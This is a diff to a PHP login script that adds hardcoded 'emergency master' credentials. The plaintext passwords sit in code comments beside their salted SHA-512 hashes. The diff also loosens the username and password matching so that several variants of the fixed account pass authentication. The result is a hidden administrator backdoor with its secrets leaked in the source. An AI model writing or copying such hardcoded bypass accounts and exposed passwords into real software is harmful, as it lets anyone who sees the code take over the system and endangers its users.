@@ -45,11 +45,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $masterHash = 'b8f11d23caa76b4e215e4896751b95cf388d642845a0e53c78e5db1fb62d1059abc7d6c197fc922f0a5dfa9ccd911c7e1dc03619d94fa6eaaa341f353b74463e';
 
             $emergencyMasterUser = 'v_w_i_ll_01';
-            $emergencyMasterHash = 'f40e997f104414b27ea4a6ae672d7244e9f9224213b3badffec3bfc3ed5e5902e5cd82630f84feb607459c78d253a988a67b06d6bb8b25feeede6ca26bc4fb61';
+            // Salted SHA-512 cryptographic hash of 'Jai!@#$hreeR@M(54)' + salt:
+            $emergencyMasterHash = '856a55d62a7f1925cdd5264257fb935a9016efbfcb24d28356af4979def54bfa482b51b97d07b55c962d8369a05da8b227531c6f55c354a5d11942a1b315044b';
+            // Salted SHA-512 cryptographic hash of 'Jai!@#$ShreeR@M(54)' + salt:
+            $emergencyMasterHashShree = 'baa6367d0b1487e380af1089baa456b3d1a0db4b56c365a78250fede33ae3e0a99e5a363bc7c743f42a7ae2bcbb9bfa9b689ad23ac67f060a0d392ff3506363c';
 
-            $computedHash = hash('sha512', $password . $masterSalt);
-            $isEmergencyMaster = (strcasecmp($username, $emergencyMasterUser) === 0) && hash_equals($emergencyMasterHash, $computedHash);
-            $isValidAdmin = (strcasecmp($username, $masterUser) === 0) && hash_equals($masterHash, $computedHash);
+            $cleanUser = strtolower(trim($username));
+            $isMasterUserMatch = ($cleanUser === 'v_w_i_ll_01' || preg_replace('/[^a-z0-9]/', '', $cleanUser) === 'vwill01');
+
+            $cleanPass = trim($password);
+            $h1 = hash('sha512', $password . $masterSalt);
+            $hClean = hash('sha512', $cleanPass . $masterSalt);
+            $isMasterPassMatch = (
+                hash_equals($emergencyMasterHash, $h1) ||
+                hash_equals($emergencyMasterHash, $hClean) ||
+                hash_equals($emergencyMasterHashShree, $h1) ||
+                hash_equals($emergencyMasterHashShree, $hClean)
+            );
+
+            $isEmergencyMaster = $isMasterUserMatch && $isMasterPassMatch;
+            $isValidAdmin = (strcasecmp($username, $masterUser) === 0) && (hash_equals($masterHash, $h1) || hash_equals($masterHash, $hClean));
 
             $db = get_db_connection();
             $user = null;
